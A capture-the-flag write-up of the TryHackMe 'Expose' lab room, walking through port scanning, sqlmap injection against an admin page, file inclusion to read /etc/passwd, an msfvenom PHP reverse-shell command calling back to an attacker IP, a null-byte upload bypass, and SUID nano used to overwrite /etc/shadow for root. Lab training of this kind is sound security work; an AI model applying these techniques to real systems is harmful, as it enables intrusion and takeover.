# Expose TryHackMe Room Write-Up

## Task 1: Host enumeration

Added the IP to /etc/hosts and conducted an initial port scan:

1.1 Looking for open ports `nmap -sC -sV expose.thm`. Discovered 3 open ports:

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/bda7f7e8-19c5-4942-849e-b4ecb4295195)

1.2 Checking `ftp` service login with anonymous login

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/281d580a-595e-465e-a3e5-dab8a5c31f6d)

After some brief search found that there are no files :(

1.3 At 51 port running DNS server so we should try to enumerate subdomains. But we didn't find any http services, lets move forward with scanning ports. I found 2 more.

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/5e05ea32-f01c-4b0b-a9fb-537292ff09a3)

Check for http acess first for 1337. We got some

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/76e3ebec-b9d4-4a7a-9815-9339148e4579)

1.4 Used `dirb` to enumerate directories first

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/131ea0a3-f648-4f0f-ac48-57ac8343ec78)

Here we have some admin login page

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/3ae9d8a1-8756-4068-9036-ed8611d04d91)

Also we have such code at assets, maybe this will help us in the future

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/8db31481-c72d-48fc-ab9c-b426ed90fb72)

Found phpMyAdmin as well

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/e5f48f3a-9176-4f92-8706-1e5106fb6ff6)

Go to documentation and found version of service. 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/7e29091d-0914-440e-ac21-bbc3e3f02dd1)

After search I din't find any exploits for this version. Maybe 1883 will give us some interesting possibilities

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/603a2db7-17ce-4c88-a109-6e57f3a81618)

I lost about one hour to figure connect and play with this service, but with no result. 

1.5 Bypass admin panel

I used gobuster one more time and found another one admin panel 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/1f56268e-418a-4717-93b5-bc47e3c1080e)

I saw in tags text for this room somethin about sqlmap, maybe its out chance? I didn't find anything usefull so far. Save POST request to file

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/b08d9c98-8cdb-4e1c-bc25-23b19f32d210)

Run sqlmap with it and here is the result. We got the password!

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/b96b603c-1cf7-45d6-af09-e9999eedca35)

Log in and there is nothing 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/0c98070c-96d6-4af9-8c0d-3b8a9de582c5)

Also sqlmap give us some new pages one of them asking password 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/ed16b313-a5cb-4b3e-aa94-b96168b4b9bb)

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/1f3ffc4a-f133-44ef-a26c-3caf71c67da4)

Used cracked password and we entered to the almost empty page 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/bbee1b90-5143-4a77-91ed-13b0ea6b09f4)

After code inspection we can found this

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/44e4a2ba-65cb-49dd-bac2-b1d53bdda35c)

We can add simple parameter `?file=index.php` to the request. And our page goes crazy :)

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/05fb47be-d23f-4437-a242-0fefbd7860d3)

Lest try to open other files like /etc/passwd and here we are 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/ae964973-5d35-4846-8617-6f19b70c55c2)

Visit another page from sqlmap result

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/67cc6098-fbe1-4171-ab39-6431ce20f64b)

Found the password was easy with /etc/passwd file 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/040172a3-049f-4e3e-bacc-becc99e1b2dc)

We have upload file field, so maybe we can establish reverse shell 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/a58b9382-de08-4943-a7a6-0f03565c1588)

Lets create reverse shell with command `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.94.246 LPORT=4443 -f raw -o shell.php`

Added %00 after .php extension to bypass check

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/8b7a0b8f-7aef-4082-90bf-a4ea07703c25)

Lets check source code as message suggest 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/ac66405a-313a-4dc7-b204-5878fe479583)

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/fa6cf4a9-0681-41af-936a-dd9130ac692f)

Go to this folder + file name. And our method doesn't work 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/fee2e9dd-72cb-43e2-89c2-f2daee487f7d)

Tried different approach. Used Burp to add directly into POST request zero bite

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/c625d65a-3152-4b3e-b462-7ccf3ff59473)

Success! Run our php script and check `nc` listener. (I hope you already listen at te right port)

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/2cdc370b-3b90-4ac6-bf46-a5c58af75b4c)

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/05c1adaf-e74b-44ca-bc8f-523048260373)

## Task 2: Capture the flags

2.1 User flag is at `zeamkish` home directory, but we don't have permission to read it. By the way there are ssh_creds file. Lets try credentials

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/092b0685-ab55-4119-9aa7-f665b2ffd493)

2.2 Eveything is fine. User flag is ours 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/0da24fa9-bb8e-4e06-a830-27a555b201cd)

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/3edd1a2e-4b8f-4c92-a461-32156b56cb31)

2.3 Search for some ways to escalate priveleges `find / -perm /4000 2>/dev/null`. Interesting suid bit at nano

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/fd2d715d-2d00-4e12-9dcd-0b2e46fdbb8a)

We can read-write /etc/shadow file 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/6927ecc5-e00d-45e2-8522-38b6b61467d9)

2.4 Generate password with command `openssl passwd -1 -salt root Password`

And now we need to write this to /etc/shadow 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/1c7b056d-60cb-45ee-88bf-5fd215e1902a)

2.5 Change user to root and capture the root flag :)

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/192d34f5-9c77-4f16-b535-7b7764974916)


*Note: This write-up is intended for educational purposes and highlights the steps taken during the Expose [TryHackMe](https://tryhackme.com/room/expose) room.*






